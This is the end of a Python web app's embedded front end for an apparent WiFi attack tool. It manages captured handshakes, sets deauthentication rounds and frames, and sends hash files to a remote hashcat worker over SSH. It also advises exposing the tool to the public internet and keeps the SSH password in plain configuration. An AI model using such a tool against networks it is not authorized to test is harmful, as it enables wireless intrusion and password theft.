      : '<span class="badge badge-blue">抓包</span>';
    html += '<tr>'
      + '<td style="font-family:monospace;font-size:12px;">' + escapeHtml(f.name) + '</td>'
      + '<td>' + badge + '</td>'
      + '<td>' + f.size_human + '</td>'
      + '<td style="color:var(--text2);font-size:12px;">' + f.modified + '</td>'
      + '<td style="white-space:nowrap;">'
      + (f.type === '哈希文件' ? '<button class="btn btn-sm btn-primary" onclick="crackAsset(\'' + f.name + '\')" style="margin-right:8px;">破解</button>' : '')
      + '<a href="/api/assets/' + encodeURIComponent(f.name) + '" download="' + f.name + '" class="btn btn-sm btn-ghost" style="text-decoration:none;margin-right:8px;">下载</a>'
      + '<button class="btn btn-sm btn-ghost" onclick="deleteAsset(\'' + f.name + '\')">删除</button>'
      + '</td></tr>';
  });
  html += '</tbody></table>';
  list.innerHTML = html;
}

async function deleteAsset(filename) {
  if (!confirm('确认删除 ' + filename + ' ?')) return;
  await fetch('/api/assets/' + encodeURIComponent(filename), {method: 'DELETE'});
  loadAssets();
}

async function crackAsset(filename) {
  if (!confirm('使用资产文件 ' + filename + ' 直接发起破解？')) return;
  await fetch('/api/attack/from_asset', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({filename: filename})
  });
  // 跳转到攻击页面
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab')[2].classList.add('active');
  document.getElementById('panel-attack').classList.add('active');
  document.getElementById('attack-target').innerHTML = '<span style="color:var(--text);font-weight:500;">从资产文件破解</span><span style="color:var(--text2);font-family:monospace;font-size:12px;margin-left:12px;">' + filename + '</span>';
  document.getElementById('attack-btn').disabled = true;
  document.getElementById('attack-result').innerHTML = '';
  document.getElementById('attack-log').innerHTML = '';
  if (attackPoller) clearInterval(attackPoller);
  attackPoller = setInterval(pollAttack, 1500);
}

// ---- 配置 ----
async function loadConfig() {
  const r = await fetch('/api/config');
  const c = await r.json();
  document.getElementById('cfg-host').value = c.windows_host || '';
  document.getElementById('cfg-port').value = c.windows_port || 22;
  document.getElementById('cfg-user').value = c.windows_user || '';
  document.getElementById('cfg-password').value = c.windows_password || '';
  document.getElementById('cfg-hashcat').value = c.hashcat_path || '';
  document.getElementById('cfg-scan').value = c.scan_duration || 20;
  document.getElementById('cfg-refresh').value = c.scan_refresh || 2;
  document.getElementById('cfg-continuous').checked = c.scan_continuous || false;
  document.getElementById('cfg-rounds').value = c.deauth_rounds || 3;
  document.getElementById('cfg-frames').value = c.deauth_frames || 10;
  document.getElementById('cfg-wait').value = c.deauth_wait || 18;
  document.getElementById('cfg-mode').value = c.hashcat_mode || '22000';
  document.getElementById('cfg-mask').value = c.hashcat_mask || '';
}

async function saveConfig() {
  const cfg = {
    windows_host: document.getElementById('cfg-host').value,
    windows_port: parseInt(document.getElementById('cfg-port').value) || 22,
    windows_user: document.getElementById('cfg-user').value,
    windows_password: document.getElementById('cfg-password').value,
    hashcat_path: document.getElementById('cfg-hashcat').value,
    scan_duration: parseInt(document.getElementById('cfg-scan').value) || 20,
    scan_refresh: parseInt(document.getElementById('cfg-refresh').value) || 2,
    scan_continuous: document.getElementById('cfg-continuous').checked,
    deauth_rounds: parseInt(document.getElementById('cfg-rounds').value) || 3,
    deauth_frames: parseInt(document.getElementById('cfg-frames').value) || 10,
    deauth_wait: parseInt(document.getElementById('cfg-wait').value) || 18,
    hashcat_mode: document.getElementById('cfg-mode').value,
    hashcat_mask: document.getElementById('cfg-mask').value,
  };
  await fetch('/api/config', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(cfg)
  });
  const s = document.getElementById('cfg-saved');
  s.style.display = 'inline';
  setTimeout(() => s.style.display = 'none', 2000);
}

async function testWorker() {
  const cfg = {
    windows_host: document.getElementById('cfg-host').value,
    windows_port: parseInt(document.getElementById('cfg-port').value) || 22,
    windows_user: document.getElementById('cfg-user').value,
    windows_password: document.getElementById('cfg-password').value,
    hashcat_path: document.getElementById('cfg-hashcat').value,
    scan_duration: parseInt(document.getElementById('cfg-scan').value) || 20,
    scan_refresh: parseInt(document.getElementById('cfg-refresh').value) || 2,
    deauth_rounds: parseInt(document.getElementById('cfg-rounds').value) || 3,
    deauth_frames: parseInt(document.getElementById('cfg-frames').value) || 10,
    deauth_wait: parseInt(document.getElementById('cfg-wait').value) || 18,
    hashcat_mode: document.getElementById('cfg-mode').value,
    hashcat_mask: document.getElementById('cfg-mask').value,
  };

  const btn = document.getElementById('test-btn');
  const resultDiv = document.getElementById('test-result');
  const statusDiv = document.getElementById('test-status');
  const stepsDiv = document.getElementById('test-steps');

  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> 测试中...';
  resultDiv.style.display = 'block';
  statusDiv.className = 'status-box status-running';
  statusDiv.innerHTML = '<span class="spinner"></span> 正在测试计算节点...';
  stepsDiv.innerHTML = '';

  try {
    const r = await fetch('/api/worker/test', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(cfg)
    });
    const data = await r.json();

    if (data.ok) {
      statusDiv.className = 'status-box status-success';
      statusDiv.innerHTML = '✓ 计算节点测试全部通过，可以正常使用';
    } else {
      statusDiv.className = 'status-box status-failed';
      statusDiv.innerHTML = '✗ 测试未通过，请检查下方失败项';
    }

    if (data.results && data.results.length) {
      let html = '<table><thead><tr><th>检测项</th><th>状态</th><th>详情</th></tr></thead><tbody>';
      data.results.forEach(step => {
        const badge = step.ok
          ? '<span class="badge badge-green">通过</span>'
          : '<span class="badge badge-red">失败</span>';
        html += `<tr>
          <td style="font-weight:500">${escapeHtml(step.name)}</td>
          <td>${badge}</td>
          <td style="color:var(--text2);font-size:12px">${escapeHtml(step.detail || '')}</td>
        </tr>`;
      });
      html += '</tbody></table>';
      stepsDiv.innerHTML = html;
    }
  } catch (e) {
    statusDiv.className = 'status-box status-failed';
    statusDiv.textContent = '请求失败: ' + e.message;
  }

  btn.disabled = false;
  btn.textContent = '测试连接';
}

// 初始化
loadConfig();
</script>
</body>
</html>
"""

if __name__ == "__main__":
    import uvicorn
    print("=" * 55)
    print("  WiFi 测试工具已启动")
    print("  Kali 本地:  http://127.0.0.1:8000")
    print("  局域网访问: http://<Kali-IP>:8000")
    print("  公网访问:   路由器映射 8000 端口 -> Kali")
    print("=" * 55)
    uvicorn.run(app, host="0.0.0.0", port=8000)
